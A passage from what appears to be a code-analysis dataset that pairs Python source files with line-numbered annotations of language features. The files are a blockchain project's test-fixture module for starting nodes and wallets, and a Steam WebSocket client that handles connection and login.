asyncio.create_task(spawn_process(self_hostname, port, 1))\n    vdf_task_2 = asyncio.create_task(spawn_process(self_hostname, port, 2))\n    vdf_task_3 = asyncio.create_task(spawn_process(self_hostname, port, 3))\n    def stop():\n        asyncio.create_task(kill_processes())\n    asyncio.get_running_loop().add_signal_handler(signal.SIGTERM, stop)\n    asyncio.get_running_loop().add_signal_handler(signal.SIGINT, stop)\n    yield vdf_task_1, vdf_task_2, vdf_task_3\n    await kill_processes()\nasync def setup_timelord(port, full_node_port, sanitizer, consensus_constants: ConsensusConstants, b_tools):\n    config = b_tools.config[\"timelord\"]\n    config[\"port\"] = port\n    config[\"full_node_peer\"][\"port\"] = full_node_port\n    config[\"sanitizer_mode\"] = sanitizer\n    config[\"fast_algorithm\"] = False\n    if sanitizer:\n        config[\"vdf_server\"][\"port\"] = 7999\n    kwargs = service_kwargs_for_timelord(b_tools.root_path, config, consensus_constants)\n    kwargs.update(\n        parse_cli_args=False,\n        connect_to_daemon=False,\n    )\n    service = Service(**kwargs)\n    await service.start()\n    yield service._api, service._node.server\n    service.stop()\n    await service.wait_closed()\nasync def setup_two_nodes(consensus_constants: ConsensusConstants):\n    node_iters = [\n        setup_full_node(\n            consensus_constants, \"blockchain_test.db\", 21234, BlockTools(constants=test_constants), simulator=False\n        ),\n        setup_full_node(\n            consensus_constants, \"blockchain_test_2.db\", 21235, BlockTools(constants=test_constants), simulator=False\n        ),\n    ]\n    fn1 = await node_iters[0].__anext__()\n    fn2 = await node_iters[1].__anext__()\n    yield fn1, fn2, fn1.full_node.server, fn2.full_node.server\n    await _teardown_nodes(node_iters)\nasync def setup_n_nodes(consensus_constants: ConsensusConstants, n: int):\n    port_start = 21244\n    node_iters = []\n    for i in range(n):\n        node_iters.append(\n            setup_full_node(\n                consensus_constants,\n                f\"blockchain_test_{i}.db\",\n                port_start + i,\n                BlockTools(constants=test_constants),\n                simulator=False,\n            )\n        )\n    nodes = []\n    for ni in node_iters:\n        nodes.append(await ni.__anext__())\n    yield nodes\n    await _teardown_nodes(node_iters)\nasync def setup_node_and_wallet(consensus_constants: ConsensusConstants, starting_height=None, key_seed=None):\n    btools = BlockTools(constants=test_constants)\n    node_iters = [\n        setup_full_node(consensus_constants, \"blockchain_test.db\", 21234, btools, simulator=False),\n        setup_wallet_node(21235, consensus_constants, btools, None, starting_height=starting_height, key_seed=key_seed),\n    ]\n    full_node_api = await node_iters[0].__anext__()\n    wallet, s2 = await node_iters[1].__anext__()\n    yield full_node_api, wallet, full_node_api.full_node.server, s2\n    await _teardown_nodes(node_iters)\nasync def setup_simulators_and_wallets(\n    simulator_count: int,\n    wallet_count: int,\n    dic: Dict,\n    starting_height=None,\n    key_seed=None,\n    starting_port=50000,\n):\n    simulators: List[FullNodeAPI] = []\n    wallets = []\n    node_iters = []\n    consensus_constants = constants_for_dic(dic)\n    for index in range(0, simulator_count):\n        port = starting_port + index\n        db_name = f\"blockchain_test_{port}.db\"\n        bt_tools = BlockTools(consensus_constants, const_dict=dic)  \n        sim = setup_full_node(\n            bt_tools.constants,\n            db_name,\n            port,\n            bt_tools,\n            simulator=True,\n        )\n        simulators.append(await sim.__anext__())\n        node_iters.append(sim)\n    for index in range(0, wallet_count):\n        if key_seed is None:\n            seed = std_hash(uint32(index))\n        else:\n            seed = key_seed\n        port = starting_port + 5000 + index\n        bt_tools = BlockTools(consensus_constants, const_dict=dic)  \n        wlt = setup_wallet_node(\n            port,\n            bt_tools.constants,\n            bt_tools,\n            None,\n            key_seed=seed,\n            starting_height=starting_height,\n        )\n        wallets.append(await wlt.__anext__())\n        node_iters.append(wlt)\n    yield simulators, wallets\n    await _teardown_nodes(node_iters)\nasync def setup_farmer_harvester(consensus_constants: ConsensusConstants):\n    node_iters = [\n        setup_harvester(21234, 21235, consensus_constants, bt),\n        setup_farmer(21235, consensus_constants, bt),\n    ]\n    harvester, harvester_server = await node_iters[0].__anext__()\n    farmer, farmer_server = await node_iters[1].__anext__()\n    yield harvester, farmer\n    await _teardown_nodes(node_iters)\nasync def setup_full_system(\n    consensus_constants: ConsensusConstants, b_tools=None, b_tools_1=None, connect_to_daemon=False\n):\n    if b_tools is None:\n        b_tools = BlockTools(constants=test_constants)\n    if b_tools_1 is None:\n        b_tools_1 = BlockTools(constants=test_constants)\n    node_iters = [\n        setup_introducer(21233),\n        setup_harvester(21234, 21235, consensus_constants, b_tools),\n        setup_farmer(21235, consensus_constants, b_tools, uint16(21237)),\n        setup_vdf_clients(9000),\n        setup_timelord(21236, 21237, False, consensus_constants, b_tools),\n        setup_full_node(\n            consensus_constants, \"blockchain_test.db\", 21237, b_tools, 21233, False, 10, True, connect_to_daemon\n        ),\n        setup_full_node(\n            consensus_constants, \"blockchain_test_2.db\", 21238, b_tools_1, 21233, False, 10, True, connect_to_daemon\n        ),\n        setup_vdf_client(7999),\n        setup_timelord(21239, 21238, True, consensus_constants, b_tools_1),\n    ]\n    introducer, introducer_server = await node_iters[0].__anext__()\n    harvester, harvester_server = await node_iters[1].__anext__()\n    farmer, farmer_server = await node_iters[2].__anext__()\n    async def num_connections():\n        count = len(harvester.server.all_connections.items())\n        return count\n    await time_out_assert_custom_interval(10, 3, num_connections, 1)\n    vdf_clients = await node_iters[3].__anext__()\n    timelord, timelord_server = await node_iters[4].__anext__()\n    node_api_1 = await node_iters[5].__anext__()\n    node_api_2 = await node_iters[6].__anext__()\n    vdf_sanitizer = await node_iters[7].__anext__()\n    sanitizer, sanitizer_server = await node_iters[8].__anext__()\n    yield (\n        node_api_1,\n        node_api_2,\n        harvester,\n        farmer,\n        introducer,\n        timelord,\n        vdf_clients,\n        vdf_sanitizer,\n        sanitizer,\n        node_api_1.full_node.server,\n    )\n    await _teardown_nodes(node_iters)",
            "patterns": {
                "pep_468": [
                    [
                        27,
                        "test_constants.replace(**dic)"
                    ],
                    [
                        78,
                        "consensus_constants.replace_str_to_bytes(**overrides)"
                    ],
                    [
                        87,
                        "Service(**kwargs)"
                    ],
                    [
                        141,
                        "Service(**kwargs)"
                    ],
                    [
                        158,
                        "Service(**kwargs)"
                    ],
                    [
                        185,
                        "Service(**kwargs)"
                    ],
                    [
                        200,
                        "Service(**kwargs)"
                    ],
                    [
                        236,
                        "Service(**kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        118,
                        "db_path_replaced: str = db_name.replace(\"KEY\", db_path_key_suffix)"
                    ],
                    [
                        290,
                        "simulators: List[FullNodeAPI] = []"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        4,
                        "from typing import Dict, List, Optional",
                        "suggestion"
                    ],
                    [
                        4,
                        "from typing import Dict, List, Optional",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        290,
                        "    simulators: List[FullNodeAPI] = []",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        35,
                        48,
                        "async generator",
                        "async def setup_daemon(btools):\n    root_path = btools.root_path\n    config = btools.config\n    lockfile = singleton(daemon_launch_lock_path(root_path))\n    crt_path = root_path / config[\"daemon_ssl\"][\"private_crt\"]\n    key_path = root_path / config[\"daemon_ssl\"][\"private_key\"]\n    ca_crt_path = root_path / config[\"private_ssl_ca\"][\"crt\"]\n    ca_key_path = root_path / config[\"private_ssl_ca\"][\"key\"]\n    assert lockfile is not None\n    create_server_for_daemon(btools.root_path)\n    ws_server = WebSocketServer(root_path, ca_crt_path, ca_key_path, crt_path, key_path)\n    await ws_server.start()\n    yield ws_server\n    await ws_server.stop()"
                    ],
                    [
                        49,
                        93,
                        "async generator",
                        "async def setup_full_node(\n    consensus_constants: ConsensusConstants,\n    db_name,\n    port,\n    local_bt,\n    introducer_port=None,\n    simulator=False,\n    send_uncompact_interval=0,\n    sanitize_weight_proof_only=False,\n    connect_to_daemon=False,\n):\n    db_path = local_bt.root_path / f\"{db_name}\"\n    if db_path.exists():\n        db_path.unlink()\n    config = local_bt.config[\"full_node\"]\n    config[\"database_path\"] = db_name\n    config[\"send_uncompact_interval\"] = send_uncompact_interval\n    config[\"target_uncompact_proofs\"] = 30\n    config[\"peer_connect_interval\"] = 50\n    config[\"sanitize_weight_proof_only\"] = sanitize_weight_proof_only\n    if introducer_port is not None:\n        config[\"introducer_peer\"][\"host\"] = self_hostname\n        config[\"introducer_peer\"][\"port\"] = introducer_port\n    else:\n        config[\"introducer_peer\"] = None\n    config[\"dns_servers\"] = []\n    config[\"port\"] = port\n    config[\"rpc_port\"] = port + 1000\n    overrides = config[\"network_overrides\"][\"constants\"][config[\"selected_network\"]]\n    updated_constants = consensus_constants.replace_str_to_bytes(**overrides)\n    if simulator:\n        kwargs = service_kwargs_for_full_node_simulator(local_bt.root_path, config, local_bt)\n    else:\n        kwargs = service_kwargs_for_full_node(local_bt.root_path, config, updated_constants)\n    kwargs.update(\n        parse_cli_args=False,\n        connect_to_daemon=connect_to_daemon,\n    )\n    service = Service(**kwargs)\n    await service.start()\n    yield service._api\n    service.stop()\n    await service.wait_closed()\n    if db_path.exists():\n        db_path.unlink()"
                    ],
                    [
                        94,
                        148,
                        "async generator",
                        "async def setup_wallet_node(\n    port,\n    consensus_constants: ConsensusConstants,\n    local_bt,\n    full_node_port=None,\n    introducer_port=None,\n    key_seed=None,\n    starting_height=None,\n):\n    config = bt.config[\"wallet\"]\n    config[\"port\"] = port\n    config[\"rpc_port\"] = port + 1000\n    if starting_height is not None:\n        config[\"starting_height\"] = starting_height\n    config[\"initial_num_public_keys\"] = 5\n    entropy = token_bytes(32)\n    keychain = Keychain(entropy.hex(), True)\n    if key_seed is None:\n        key_seed = entropy\n    keychain.add_private_key(bytes_to_mnemonic(key_seed), \"\")\n    first_pk = keychain.get_first_public_key()\n    assert first_pk is not None\n    db_path_key_suffix = str(first_pk.get_fingerprint())\n    db_name = f\"test-wallet-db-{port}-KEY.sqlite\"\n    db_path_replaced: str = db_name.replace(\"KEY\", db_path_key_suffix)\n    db_path = bt.root_path / db_path_replaced\n    if db_path.exists():\n        db_path.unlink()\n    config[\"database_path\"] = str(db_name)\n    config[\"testing\"] = True\n    config[\"introducer_peer\"][\"host\"] = self_hostname\n    if introducer_port is not None:\n        config[\"introducer_peer\"][\"port\"] = introducer_port\n        config[\"peer_connect_interval\"] = 10\n    else:\n        config[\"introducer_peer\"] = None\n    if full_node_port is not None:\n        config[\"full_node_peer\"] = {}\n        config[\"full_node_peer\"][\"host\"] = self_hostname\n        config[\"full_node_peer\"][\"port\"] = full_node_port\n    else:\n        del config[\"full_node_peer\"]\n    kwargs = service_kwargs_for_wallet(local_bt.root_path, config, consensus_constants, keychain)\n    kwargs.update(\n        parse_cli_args=False,\n        connect_to_daemon=False,\n    )\n    service = Service(**kwargs)\n    await service.start(new_wallet=True)\n    yield service._node, service._node.server\n    service.stop()\n    await service.wait_closed()\n    if db_path.exists():\n        db_path.unlink()\n    keychain.delete_all_keys()"
                    ],
                    [
                        149,
                        162,
                        "async generator",
                        "async def setup_harvester(port, farmer_port, consensus_constants: ConsensusConstants, b_tools):\n    kwargs = service_kwargs_for_harvester(b_tools.root_path, b_tools.config[\"harvester\"], consensus_constants)\n    kwargs.update(\n        server_listen_ports=[port],\n        advertised_port=port,\n        connect_peers=[PeerInfo(self_hostname, farmer_port)],\n        parse_cli_args=False,\n        connect_to_daemon=False,\n    )\n    service = Service(**kwargs)\n    await service.start()\n    yield service._node, service._node.server\n    service.stop()\n    await service.wait_closed()"
                    ],
                    [
                        163,
                        189,
                        "async generator",
                        "async def setup_farmer(\n    port,\n    consensus_constants: ConsensusConstants,\n    b_tools,\n    full_node_port: Optional[uint16] = None,\n):\n    config = bt.config[\"farmer\"]\n    config_pool = bt.config[\"pool\"]\n    config[\"lotus_target_address\"] = encode_puzzle_hash(b_tools.farmer_ph, \"lotus\")\n    config[\"pool_public_keys\"] = [bytes(pk).hex() for pk in b_tools.pool_pubkeys]\n    config[\"port\"] = port\n    config_pool[\"lotus_target_address\"] = encode_puzzle_hash(b_tools.pool_ph, \"lotus\")\n    if full_node_port:\n        config[\"full_node_peer\"][\"host\"] = self_hostname\n        config[\"full_node_peer\"][\"port\"] = full_node_port\n    else:\n        del config[\"full_node_peer\"]\n    kwargs = service_kwargs_for_farmer(b_tools.root_path, config, config_pool, b_tools.keychain, consensus_constants)\n    kwargs.update(\n        parse_cli_args=False,\n        connect_to_daemon=False,\n    )\n    service = Service(**kwargs)\n    await service.start()\n    yield service._api, service._node.server\n    service.stop()\n    await service.wait_closed()"
                    ],
                    [
                        190,
                        204,
                        "async generator",
                        "async def setup_introducer(port):\n    kwargs = service_kwargs_for_introducer(\n        bt.root_path,\n        bt.config[\"introducer\"],\n    )\n    kwargs.update(\n        advertised_port=port,\n        parse_cli_args=False,\n        connect_to_daemon=False,\n    )\n    service = Service(**kwargs)\n    await service.start()\n    yield service._api, service._node.server\n    service.stop()\n    await service.wait_closed()"
                    ],
                    [
                        205,
                        212,
                        "async generator",
                        "async def setup_vdf_client(port):\n    vdf_task_1 = asyncio.create_task(spawn_process(self_hostname, port, 1))\n    def stop():\n        asyncio.create_task(kill_processes())\n    asyncio.get_running_loop().add_signal_handler(signal.SIGTERM, stop)\n    asyncio.get_running_loop().add_signal_handler(signal.SIGINT, stop)\n    yield vdf_task_1\n    await kill_processes()"
                    ],
                    [
                        213,
                        222,
                        "async generator",
                        "async def setup_vdf_clients(port):\n    vdf_task_1 = asyncio.create_task(spawn_process(self_hostname, port, 1))\n    vdf_task_2 = asyncio.create_task(spawn_process(self_hostname, port, 2))\n    vdf_task_3 = asyncio.create_task(spawn_process(self_hostname, port, 3))\n    def stop():\n        asyncio.create_task(kill_processes())\n    asyncio.get_running_loop().add_signal_handler(signal.SIGTERM, stop)\n    asyncio.get_running_loop().add_signal_handler(signal.SIGINT, stop)\n    yield vdf_task_1, vdf_task_2, vdf_task_3\n    await kill_processes()"
                    ],
                    [
                        223,
                        240,
                        "async generator",
                        "async def setup_timelord(port, full_node_port, sanitizer, consensus_constants: ConsensusConstants, b_tools):\n    config = b_tools.config[\"timelord\"]\n    config[\"port\"] = port\n    config[\"full_node_peer\"][\"port\"] = full_node_port\n    config[\"sanitizer_mode\"] = sanitizer\n    config[\"fast_algorithm\"] = False\n    if sanitizer:\n        config[\"vdf_server\"][\"port\"] = 7999\n    kwargs = service_kwargs_for_timelord(b_tools.root_path, config, consensus_constants)\n    kwargs.update(\n        parse_cli_args=False,\n        connect_to_daemon=False,\n    )\n    service = Service(**kwargs)\n    await service.start()\n    yield service._api, service._node.server\n    service.stop()\n    await service.wait_closed()"
                    ],
                    [
                        241,
                        253,
                        "async generator",
                        "async def setup_two_nodes(consensus_constants: ConsensusConstants):\n    node_iters = [\n        setup_full_node(\n            consensus_constants, \"blockchain_test.db\", 21234, BlockTools(constants=test_constants), simulator=False\n        ),\n        setup_full_node(\n            consensus_constants, \"blockchain_test_2.db\", 21235, BlockTools(constants=test_constants), simulator=False\n        ),\n    ]\n    fn1 = await node_iters[0].__anext__()\n    fn2 = await node_iters[1].__anext__()\n    yield fn1, fn2, fn1.full_node.server, fn2.full_node.server\n    await _teardown_nodes(node_iters)"
                    ],
                    [
                        254,
                        271,
                        "async generator",
                        "async def setup_n_nodes(consensus_constants: ConsensusConstants, n: int):\n    port_start = 21244\n    node_iters = []\n    for i in range(n):\n        node_iters.append(\n            setup_full_node(\n                consensus_constants,\n                f\"blockchain_test_{i}.db\",\n                port_start + i,\n                BlockTools(constants=test_constants),\n                simulator=False,\n            )\n        )\n    nodes = []\n    for ni in node_iters:\n        nodes.append(await ni.__anext__())\n    yield nodes\n    await _teardown_nodes(node_iters)"
                    ],
                    [
                        272,
                        281,
                        "async generator",
                        "async def setup_node_and_wallet(consensus_constants: ConsensusConstants, starting_height=None, key_seed=None):\n    btools = BlockTools(constants=test_constants)\n    node_iters = [\n        setup_full_node(consensus_constants, \"blockchain_test.db\", 21234, btools, simulator=False),\n        setup_wallet_node(21235, consensus_constants, btools, None, starting_height=starting_height, key_seed=key_seed),\n    ]\n    full_node_api = await node_iters[0].__anext__()\n    wallet, s2 = await node_iters[1].__anext__()\n    yield full_node_api, wallet, full_node_api.full_node.server, s2\n    await _teardown_nodes(node_iters)"
                    ],
                    [
                        282,
                        325,
                        "async generator",
                        "async def setup_simulators_and_wallets(\n    simulator_count: int,\n    wallet_count: int,\n    dic: Dict,\n    starting_height=None,\n    key_seed=None,\n    starting_port=50000,\n):\n    simulators: List[FullNodeAPI] = []\n    wallets = []\n    node_iters = []\n    consensus_constants = constants_for_dic(dic)\n    for index in range(0, simulator_count):\n        port = starting_port + index\n        db_name = f\"blockchain_test_{port}.db\"\n        bt_tools = BlockTools(consensus_constants, const_dict=dic)  \n        sim = setup_full_node(\n            bt_tools.constants,\n            db_name,\n            port,\n            bt_tools,\n            simulator=True,\n        )\n        simulators.append(await sim.__anext__())\n        node_iters.append(sim)\n    for index in range(0, wallet_count):\n        if key_seed is None:\n            seed = std_hash(uint32(index))\n        else:\n            seed = key_seed\n        port = starting_port + 5000 + index\n        bt_tools = BlockTools(consensus_constants, const_dict=dic)  \n        wlt = setup_wallet_node(\n            port,\n            bt_tools.constants,\n            bt_tools,\n            None,\n            key_seed=seed,\n            starting_height=starting_height,\n        )\n        wallets.append(await wlt.__anext__())\n        node_iters.append(wlt)\n    yield simulators, wallets\n    await _teardown_nodes(node_iters)"
                    ],
                    [
                        326,
                        334,
                        "async generator",
                        "async def setup_farmer_harvester(consensus_constants: ConsensusConstants):\n    node_iters = [\n        setup_harvester(21234, 21235, consensus_constants, bt),\n        setup_farmer(21235, consensus_constants, bt),\n    ]\n    harvester, harvester_server = await node_iters[0].__anext__()\n    farmer, farmer_server = await node_iters[1].__anext__()\n    yield harvester, farmer\n    await _teardown_nodes(node_iters)"
                    ],
                    [
                        335,
                        382,
                        "async generator",
                        "async def setup_full_system(\n    consensus_constants: ConsensusConstants, b_tools=None, b_tools_1=None, connect_to_daemon=False\n):\n    if b_tools is None:\n        b_tools = BlockTools(constants=test_constants)\n    if b_tools_1 is None:\n        b_tools_1 = BlockTools(constants=test_constants)\n    node_iters = [\n        setup_introducer(21233),\n        setup_harvester(21234, 21235, consensus_constants, b_tools),\n        setup_farmer(21235, consensus_constants, b_tools, uint16(21237)),\n        setup_vdf_clients(9000),\n        setup_timelord(21236, 21237, False, consensus_constants, b_tools),\n        setup_full_node(\n            consensus_constants, \"blockchain_test.db\", 21237, b_tools, 21233, False, 10, True, connect_to_daemon\n        ),\n        setup_full_node(\n            consensus_constants, \"blockchain_test_2.db\", 21238, b_tools_1, 21233, False, 10, True, connect_to_daemon\n        ),\n        setup_vdf_client(7999),\n        setup_timelord(21239, 21238, True, consensus_constants, b_tools_1),\n    ]\n    introducer, introducer_server = await node_iters[0].__anext__()\n    harvester, harvester_server = await node_iters[1].__anext__()\n    farmer, farmer_server = await node_iters[2].__anext__()\n    async def num_connections():\n        count = len(harvester.server.all_connections.items())\n        return count\n    await time_out_assert_custom_interval(10, 3, num_connections, 1)\n    vdf_clients = await node_iters[3].__anext__()\n    timelord, timelord_server = await node_iters[4].__anext__()\n    node_api_1 = await node_iters[5].__anext__()\n    node_api_2 = await node_iters[6].__anext__()\n    vdf_sanitizer = await node_iters[7].__anext__()\n    sanitizer, sanitizer_server = await node_iters[8].__anext__()\n    yield (\n        node_api_1,\n        node_api_2,\n        harvester,\n        farmer,\n        introducer,\n        timelord,\n        vdf_clients,\n        vdf_sanitizer,\n        sanitizer,\n        node_api_1.full_node.server,\n    )\n    await _teardown_nodes(node_iters)"
                    ]
                ],
                "pep_498": [
                    [
                        117,
                        "    db_name = f\"test-wallet-db-{port}-KEY.sqlite\""
                    ],
                    [
                        60,
                        "    db_path = local_bt.root_path / f\"{db_name}\""
                    ],
                    [
                        296,
                        "        db_name = f\"blockchain_test_{port}.db\""
                    ],
                    [
                        261,
                        "                f\"blockchain_test_{i}.db\","
                    ]
                ]
            }
        },
        "108": {
            "file": "import asyncio\nimport logging\nimport ssl\nfrom contextlib import suppress\nfrom typing import Optional\nimport websockets\nfrom galaxy.api.errors import BackendNotAvailable, BackendTimeout, BackendError, NetworkError\nfrom backend import SteamHttpClient\nfrom friends_cache import FriendsCache\nfrom games_cache import GamesCache\nfrom local_machine_cache import LocalMachineCache\nfrom ownership_ticket_cache import OwnershipTicketCache\nfrom protocol.protocol_client import ProtocolClient, UserActionRequired\nfrom stats_cache import StatsCache\nfrom times_cache import TimesCache\nfrom user_info_cache import UserInfoCache\nfrom websocket_list import WebSocketList\nlogger = logging.getLogger(__name__)\nlogging.getLogger(\"websockets\").setLevel(logging.WARNING)\nRECONNECT_INTERVAL_SECONDS = 20\nMAX_INCOMING_MESSAGE_SIZE = 2**24\nBLACKLISTED_CM_EXPIRATION_SEC = 300\nasync def sleep(seconds: int):\n    await asyncio.sleep(seconds)\nclass WebSocketClient:\n    def __init__(\n        self,\n        backend_client: SteamHttpClient,\n        ssl_context: ssl.SSLContext,\n        websocket_list: WebSocketList,\n        friends_cache: FriendsCache,\n        games_cache: GamesCache,\n        translations_cache: dict,\n        stats_cache: StatsCache,\n        times_cache: TimesCache,\n        user_info_cache: UserInfoCache,\n        local_machine_cache: LocalMachineCache,\n        ownership_ticket_cache: OwnershipTicketCache\n    ):\n        self._backend_client = backend_client\n        self._ssl_context = ssl_context\n        self._websocket_list = websocket_list\n        self._websocket: Optional[websockets.WebSocketClientProtocol] = None\n        self._protocol_client: Optional[ProtocolClient] = None\n        self._friends_cache = friends_cache\n        self._games_cache = games_cache\n        self._translations_cache = translations_cache\n        self._stats_cache = stats_cache\n        self._user_info_cache = user_info_cache\n        self._local_machine_cache = local_machine_cache\n        self._steam_app_ownership_ticket_cache = ownership_ticket_cache\n        self.communication_queues = {'plugin': asyncio.Queue(), 'websocket': asyncio.Queue(), 'errors': asyncio.Queue()}\n        self._times_cache = times_cache\n        self.used_server_cell_id = 0\n        self._current_ws_address: Optional[str] = None\n    async def run(self):\n        loop = asyncio.get_running_loop()\n        while True:\n            try:\n                await self._ensure_connected()\n                run_task = asyncio.create_task(self._protocol_client.run())\n                auth_lost = loop.create_future()\n                auth_task = asyncio.create_task(self._authenticate(auth_lost))\n                pending = None\n                try:\n                    done, pending = await asyncio.wait({run_task, auth_task}, return_when=asyncio.FIRST_COMPLETED)\n                    if auth_task in done:\n                        await auth_task\n                    done, pending = await asyncio.wait({run_task, auth_lost}, return_when=asyncio.FIRST_COMPLETED)\n                    if auth_lost in done:\n                        await auth_lost\n                    assert run_task in done\n                    await run_task\n                    break\n                except Exception:\n                    with suppress(asyncio.CancelledError):\n                        if pending is not None:\n                            for task in pending:\n                                task.cancel()\n                                await task\n                    raise\n            except asyncio.CancelledError as e:\n                logger.warning(f\"Websocket task cancelled {repr(e)}\")\n                raise\n            except websockets.ConnectionClosedOK:\n                logger.debug(\"Expected WebSocket disconnection\")\n            except websockets.ConnectionClosedError as error:\n                logger.warning(\"WebSocket disconnected (%d: %s), reconnecting...\", error.code, error.reason)\n            except websockets.InvalidState as error:\n                logger.warning(\"WebSocket is trying to connect...\", error.code, error.reason)\n            except (BackendNotAvailable, BackendTimeout, BackendError) as e:\n                logger.warning(f\"{repr(e)}. Trying with different CM...\")\n                self._websocket_list.add_server_to_ignored(self._current_ws_address, timeout_sec=BLACKLISTED_CM_EXPIRATION_SEC)\n            except NetworkError:\n                logger.exception(\n                    \"Failed to establish authenticated WebSocket connection, retrying after %d seconds\",\n                    RECONNECT_INTERVAL_SECONDS\n                )\n                await sleep(RECONNECT_INTERVAL_SECONDS)\n                continue\n            except Exception as e:\n                logger.exception(f\"Failed to establish authenticated WebSocket connection {repr(e)}\")\n                await self.communication_queues['errors'].put(e)\n                raise\n            await self._close_socket()\n            await self._close_protocol_client()\n    async def _close_socket(self):\n        if self._websocket is not None:\n            logger.info(\"Closing websocket\")\n            await self._websocket.close()\n            await self._websocket.wait_closed()\n            self._websocket = None\n    async def _close_protocol_client(self):\n        is_socket_connected = True if self._websocket else False\n        if self._protocol_client is not None:\n            logger.info(\"Closing protocol client\")\n            await self._protocol_client.close(is_socket_connected)\n            await self._protocol_client.wait_closed()\n            self._protocol_client = None\n    async def close(self):\n        is_socket_connected = True if self._websocket else False\n        if self._protocol_client is not None:\n            await self._protocol_client.close(is_socket_connected)\n        if self._websocket is not None:\n            await self._websocket.close()\n    async def wait_closed(self):\n        if self._protocol_client is not None:\n            await self._protocol_client.wait_closed()\n        if self._websocket is not None:\n            await self._websocket.wait_closed()\n    async def get_friends(self):\n        await self._friends_cache.wait_ready()\n        return [str(user_id) for user_id in self._friends_cache.get_keys()]\n    async def get_friends_nicknames(self):\n        await self._friends_cache.wait_nicknames_ready()\n        return self._friends_cache.get_nicknames()\n    async def get_friends_info(self, users):\n        await self._friends_cache.wait_ready()\n        result = {}\n        for user_id in users:\n            int_user_id = int(user_id)\n            user_info = self._friends_cache.get(int_user_id)\n            if user_info is not None:\n                result[user_id] = user_info\n        return result\n    async def refresh_game_stats(self, game_ids):\n        self._stats_cache.start_game_stats_import(game_ids)\n        await self._protocol_client.import_game_stats(game_ids)\n    async def refresh_game_times(self):\n        self._times_cache.start_game_times_import()\n        await self._protocol_client.import_game_times()\n    async def retrieve_collections(self):\n        return await self._protocol_client.retrieve_collections()\n    async def _ensure_connected(self):\n        if self._protocol_client is not None:\n            return  \n        while True:\n            async for ws_address in self._websocket_list.get(self.used_server_cell_id):\n                self._current_ws_address = ws_address\n                try:\n                    self._websocket = await asyncio.wait_for(websockets.connect(ws_address, ssl=self._ssl_context, max_size=MAX_INCOMING_MESSAGE_SIZE), 5)\n                    self._protocol_client = ProtocolClient(self._websocket, self._friends_cache, self._games_cache, self._translations_cache, self._stats_cache, self._times_cache, self._user_info_cache, self._local_machine_cache, self._steam_app_ownership_ticket_cache, self.used_server_cell_id)\n                    logger.info(f'Connected to Steam on CM {ws_address} on cell_id {self.used_server_cell_id}')\n                    return\n                except (asyncio.TimeoutError, OSError, websockets.InvalidURI, websockets.InvalidHandshake):\n                    self._websocket_list.add_server_to_ignored(self._current_ws_address, timeout_sec=BLACKLISTED_CM_EXPIRATION_SEC)\n                    continue\n            logger.exception(\n                \"Failed to connect to any server, reconnecting in %d seconds...\",\n                RECONNECT_INTERVAL_SECONDS\n            )\n            await sleep(RECONNECT_INTERVAL_SECONDS)\n    async def _authenticate(self, auth_lost_future):\n        async def auth_lost_handler(error):\n            logger.warning(\"WebSocket client authentication lost\")\n            auth_lost_future.set_exception(error)\n        try:\n            if self._steam_app_ownership_ticket_cache.ticket:\n                await self._protocol_client.register_auth_ticket_with_cm(self._steam_app_ownership_ticket_cache.ticket)\n            if self._user_info_cache.token:\n                ret_code = await self._protocol_client.authenticate_token(self._user_info_cache.steam_id, self._user_info_cache.account_username, self._user_info_cache.token, auth_lost_handler)\n            else:\n                ret_code = None\n                while ret_code != UserActionRequired.NoActionRequired:\n                    if ret_code != None:\n                        await self.communication_queues['plugin'].put({'auth_result': ret_code})\n                        logger.info(f\"Put {ret_code} in the queue, waiting for other side to receive\")\n                    response = await self.communication_queues['websocket'].get()\n                    logger.info(f\" Got {response.keys()} from queue\")\n                    password = response.get('password', None)\n                    two_factor = response.get('two_factor', None)\n                    logger.info(f'Authenticating with {\"username\" if self._user_info_cache.account_username else \"\"}, {\"password\" if password else \"\"}, {\"two_factor\" if two_factor else \"\"}')\n                    ret_code = await self._protocol_client.authenticate_password(self._user_info_cache.account_username, password, two_factor, self._user_info_cache.two_step, auth_lost_handler)\n                    logger.info(f\"Response from auth {ret_code}\")\n            logger.info(\"Finished authentication\")\n            await self.communication_queues['plugin'].put({'auth_result': ret_code})\n            await self._protocol_client.get_steam_app_ownership_ticket()\n        except Exception as e:\n            await self.communication_queues['errors'].put(e)\n            raise e",
            "patterns": {
                "pep_526": [
                    [
                        43,
                        "self._websocket: Optional[websockets.WebSocketClientProtocol] = None"
                    ],
                    [
                        44,
                        "self._protocol_client: Optional[ProtocolClient] = None"
                    ],
                    [
                        55,
                        "self._current_ws_address: Optional[str] = None"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        158,
                        167,
                        "async for",
                        "async for ws_address in self._websocket_list.get(self.used_server_cell_id):\n                self._current_ws_address = ws_address\n                try:\n                    self._websocket = await asyncio.wait_for(websockets.connect(ws_address, ssl=self._ssl_context, max_size=MAX_INCOMING_MESSAGE_SIZE), 5)\n                    self._protocol_client = ProtocolClient(self._websocket, self._friends_cache, self._games_cache, self._translations_cache, self._stats_cache, self._times_cache, self._user_info_cache, self._local_machine_cache, self._steam_app_ownership_ticket_cache, self.used_server_cell_id)\n                    logger.info(f'Connected to Steam on CM {ws_address} on cell_id {self.used_server_cell_id}')\n                    return\n                except (asyncio.TimeoutError, OSError, websockets.InvalidURI, websockets.InvalidHandshake):\n                    self._websocket_list.add_server_to_ignored(self._current_ws_address, timeout_sec=BLACKLISTED_CM_EXPIRATION_SEC)\n                    continue"
                    ]
                ],
                "pep_498": [
                    [
                        83,
                        "                logger.warning(f\"Websocket task cancelled {repr(e)}\")"
                    ],
                    [
                        92,
                        "                logger.warning(f\"{repr(e)}. Trying with different CM...\")"
                    ],
                    [
                        102,
                        "                logger.exception(f\"Failed to establish authenticated WebSocket connection {repr(e)}\")"
                    ],
                    [
                        163,
                        "                    logger.info(f'Connected to Steam on CM {ws_address} on cell_id {self.used_server_cell_id}')"
                    ],
                    [
                        189,
                        "                    logger.info(f\" Got {response.keys()} from queue\")"
                    ],
                    [
                        192,
